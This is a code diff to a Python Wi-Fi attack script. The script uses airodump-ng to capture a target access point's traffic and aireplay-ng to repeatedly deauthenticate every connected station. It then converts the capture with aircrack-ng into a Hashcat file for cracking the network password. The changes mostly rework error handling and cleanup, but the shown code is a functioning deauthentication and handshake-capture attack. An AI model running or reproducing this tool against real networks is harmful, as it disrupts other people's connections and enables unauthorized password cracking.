@@ -42,7 +42,6 @@ def banner():
 def start_dump():
 
     # runs airodump-ng to start capturing traffic associated with the access point
-    
     global essid, interface, attack_delay
     parser = argparse.ArgumentParser(description=banner())
     parser.add_argument('channel', type=str, metavar='Channel', help='Channel number the AP is broadcasting on.')
@@ -63,7 +62,6 @@ def deauth():
 
     # parses the airodump-ng log file every n minutes and sends 5 deauthentification packet clusters with
     # aireplay-ng from every station that has been associated with the access point
-
     try:
         file = 'dump_' + essid + '-01.csv'
         time.sleep(10)
@@ -84,21 +82,18 @@ def deauth():
                         with open(os.devnull, 'w') as fp:
                             subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface], stdout=fp)
             time.sleep(attack_delay)
-    except KeyboardInterrupt:
-        clean()
-        quit()
+    except IndexError:
+        while True:
+            time.sleep(10)
 
 
 def clean():
 
-    # renames capture file, creates a Hashcat v3.6+ file, and removes all other log files
-    
-    try:
-        subprocess.call(['cp', dirPath + 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
-        subprocess.call(['aircrack-ng', '-j', dirPath + essid, 'dump_' + essid + '-01.cap'])
-        os.system('rm ' + dirPath + 'dump_*')
-    except:
-        quit()
+    # renames capture file, creates a Hashcat v3.6+ file, and removes all other log files  
+    subprocess.call(['cp', dirPath + 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
+    subprocess.call(['aircrack-ng', '-j', dirPath + essid, 'dump_' + essid + '-01.cap'])
+    os.system('rm ' + dirPath + 'dump_*')
+    quit()
 
 
 def main():
@@ -109,7 +104,6 @@ def main():
         deauth()
     except KeyboardInterrupt:
         clean()
-        quit()
 
 
 if __name__ == '__main__':
